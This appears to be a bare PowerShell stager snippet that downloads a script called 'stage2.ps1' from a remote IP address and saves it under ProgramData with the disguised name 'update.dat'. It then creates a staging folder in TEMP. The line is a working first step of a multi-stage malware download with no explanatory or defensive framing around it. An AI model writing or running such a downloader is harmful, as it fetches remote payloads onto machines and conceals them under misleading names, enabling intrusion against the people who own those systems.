
$TransferUrl = "https://192.0.2.171:443/stage2.ps1"; $Stage2Path = 'C:\ProgramData\update.dat'; Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
